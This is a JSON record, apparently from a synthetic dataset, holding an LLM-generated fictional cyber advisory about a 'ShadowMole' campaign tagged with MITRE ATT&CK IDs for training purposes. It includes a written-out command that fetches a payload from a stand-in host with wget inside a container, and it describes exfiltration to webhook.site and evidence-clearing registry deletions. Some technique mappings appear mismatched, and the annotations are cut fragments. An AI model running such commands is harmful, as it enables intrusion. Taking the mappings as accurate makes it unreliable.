@@ -1,0 +1,123 @@
+{
+    "report_id": "report_174",
+    "generated_at": "20251222_122530",
+    "scenario_target_ids": [
+        "T1592.001",
+        "T1591.004",
+        "T1586.003",
+        "T1587.001",
+        "T1566.002",
+        "T1609",
+        "T1569",
+        "T1543.001",
+        "T1070.007",
+        "T1553.004",
+        "T1027.012",
+        "T1606.002",
+        "T1135",
+        "T1497.002",
+        "T1090",
+        "T1567.004"
+    ],
+    "scenario_flow": [
+        "reconnaissance",
+        "reconnaissance",
+        "resource-development",
+        "resource-development",
+        "initial-access",
+        "execution",
+        "execution",
+        "privilege-escalation",
+        "defense-evasion",
+        "defense-evasion",
+        "defense-evasion",
+        "credential-access",
+        "discovery",
+        "discovery",
+        "command-and-control",
+        "exfiltration"
+    ],
+    "llm_declared_ids": [
+        "T1592.001",
+        "T1591.004",
+        "T1586.003",
+        "T1587.001",
+        "T1566.002",
+        "T1609",
+        "T1569",
+        "T1543.001",
+        "T1070.007",
+        "T1553.004",
+        "T1027.012",
+        "T1606.002",
+        "T1135",
+        "T1497.002",
+        "T1090",
+        "T1567.004"
+    ],
+    "actual_found_ids": [
+        "T1566.002",
+        "T1586.003",
+        "T1587.001",
+        "T1553.004",
+        "T1135",
+        "T1569",
+        "T1543.001",
+        "T1606.002",
+        "T1027.012",
+        "T1070.007",
+        "T1567.004",
+        "T1592.001",
+        "T1090",
+        "T1591.004",
+        "T1609",
+        "T1497.002"
+    ],
+    "clean_text": "ShadowMole likely conducted reconnaissance by using nmap.exe with the -O flag to perform operating system detection on target systems while simultaneously querying the victim's corporate website for team member bios to identify roles. Using automated tools, the adversary performed password spraying against AWS IAM users with common corporate passwords. The actors sent spearphishing emails with malicious links included, which, when clicked, downloaded a malicious backdoor.exe to enable remote command execution on infected hosts. System logs from the victim's environment show normal user activity during this period, with no immediate alerts triggered. The adversary employed a malicious.lnk file to disguise a command that downloads spyware onto the system and used PowerShell to actively collect system information and send it to a webhook.site address while simultaneously modifying registry keys to cover tracks of remote access by deleting the HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers registry data. On compromised hosts, the threat actor used svchost.exe to execute a malicious DLL that enabled remote command execution capabilities and installed a com.apple.softwareupdate.plist file in the /LaunchAgents folder with the RunAtLoad value set to true to ensure persistence on macOS systems. The backdoor executed /usr/bin/security set-trust-settings to modify certificate trust policies and ran 'docker exec malicious_container wget http://malicious.site/payload.sh' to download additional tools. AADInternals was used to create SAML tokens using the AD Federated Services token signing certificate, and APT39 has used the post exploitation tool CrackMapExec to enumerate network shares. The trojan searched system logs for 'malware.exe' entries to assess detection status, and RansomHub can use a proxy to connect to remote SFTP servers. Incident response teams noted increased network traffic to unknown IPs, but no data loss was confirmed in this simulation.",
+    "tagged_text": "ShadowMole likely conducted reconnaissance by using nmap.exe with the -O flag to perform operating system detection on target systems [T1592.001] while simultaneously querying the victim's corporate website for team member bios to identify roles [T1591.004]. Using automated tools, the adversary performed password spraying against AWS IAM users with common corporate passwords [T1586.003]. The actors sent spearphishing emails with malicious links included [T1566.002], which, when clicked, downloaded a malicious backdoor.exe to enable remote command execution on infected hosts [T1587.001]. System logs from the victim's environment show normal user activity during this period, with no immediate alerts triggered. The adversary employed a malicious.lnk file to disguise a command that downloads spyware onto the system [T1027.012] and used PowerShell to actively collect system information and send it to a webhook.site address [T1567.004] while simultaneously modifying registry keys to cover tracks of remote access by deleting the HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers registry data [T1070.007]. On compromised hosts, the threat actor used svchost.exe to execute a malicious DLL that enabled remote command execution capabilities [T1569] and installed a com.apple.softwareupdate.plist file in the /LaunchAgents folder with the RunAtLoad value set to true to ensure persistence on macOS systems [T1543.001]. The backdoor executed /usr/bin/security set-trust-settings to modify certificate trust policies [T1553.004] and ran 'docker exec malicious_container wget http://malicious.site/payload.sh' to download additional tools [T1609]. AADInternals was used to create SAML tokens using the AD Federated Services token signing certificate [T1606.002], and APT39 has used the post exploitation tool CrackMapExec to enumerate network shares [T1135]. The trojan searched system logs for 'malware.exe' entries to assess detection status [T1497.002], and RansomHub can use a proxy to connect to remote SFTP servers [T1090]. Incident response teams noted increased network traffic to unknown IPs, but no data loss was confirmed in this simulation.",
+    "sentence_annotations": [
+        {
+            "sentence": "exe to execute a malicious DLL that enabled remote command execution capabilities and installed a com.",
+            "technique_id": "T1569",
+            "technique_name": "System Services"
+        },
+        {
+            "sentence": "sh' to download additional tools.",
+            "technique_id": "T1609",
+            "technique_name": "Container Administration Command"
+        },
+        {
+            "sentence": "002], and APT39 has used the post exploitation tool CrackMapExec to enumerate network shares.",
+            "technique_id": "T1135",
+            "technique_name": "Network Share Discovery"
+        },
+        {
+            "sentence": "002], and RansomHub can use a proxy to connect to remote SFTP servers.",
+            "technique_id": "T1090",
+            "technique_name": "Proxy"
+        }
+    ],
+    "llm_raw_response": {
+        "title": "Joint Cybersecurity Advisory: Fictional Campaign 'ShadowMole' Targeting Hybrid Infrastructure",
+        "summary": "This advisory details a simulated campaign by the fictional threat actor 'ShadowMole' targeting organizations with hybrid cloud and on-premises environments. The campaign involves sophisticated reconnaissance, initial access via spearphishing, execution through multiple vectors, persistence mechanisms, defense evasion, credential access, discovery, lateral movement, collection, command and control, and exfiltration. Techniques are mapped to the MITRE ATT&CK framework for blue team training purposes.",
+        "full_report_text": "ShadowMole likely conducted reconnaissance by using nmap.exe with the -O flag to perform operating system detection on target systems [T1592.001] while simultaneously querying the victim's corporate website for team member bios to identify roles [T1591.004]. Using automated tools, the adversary performed password spraying against AWS IAM users with common corporate passwords [T1586.003]. The actors sent spearphishing emails with malicious links included [T1566.002], which, when clicked, downloaded a malicious backdoor.exe to enable remote command execution on infected hosts [T1587.001]. System logs from the victim's environment show normal user activity during this period, with no immediate alerts triggered. The adversary employed a malicious.lnk file to disguise a command that downloads spyware onto the system [T1027.012] and used PowerShell to actively collect system information and send it to a webhook.site address [T1567.004] while simultaneously modifying registry keys to cover tracks of remote access by deleting the HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers registry data [T1070.007]. On compromised hosts, the threat actor used svchost.exe to execute a malicious DLL that enabled remote command execution capabilities [T1569] and installed a com.apple.softwareupdate.plist file in the /LaunchAgents folder with the RunAtLoad value set to true to ensure persistence on macOS systems [T1543.001]. The backdoor executed /usr/bin/security set-trust-settings to modify certificate trust policies [T1553.004] and ran 'docker exec malicious_container wget http://malicious.site/payload.sh' to download additional tools [T1609]. AADInternals was used to create SAML tokens using the AD Federated Services token signing certificate [T1606.002], and APT39 has used the post exploitation tool CrackMapExec to enumerate network shares [T1135]. The trojan searched system logs for 'malware.exe' entries to assess detection status [T1497.002], and RansomHub can use a proxy to connect to remote SFTP servers [T1090]. Incident response teams noted increased network traffic to unknown IPs, but no data loss was confirmed in this simulation.",
+        "techniques_used": [
+            "T1592.001",
+            "T1591.004",
+            "T1586.003",
+            "T1587.001",
+            "T1566.002",
+            "T1609",
+            "T1569",
+            "T1543.001",
+            "T1070.007",
+            "T1553.004",
+            "T1027.012",
+            "T1606.002",
+            "T1135",
+            "T1497.002",
+            "T1090",
+            "T1567.004"
+        ]
+    }
+}
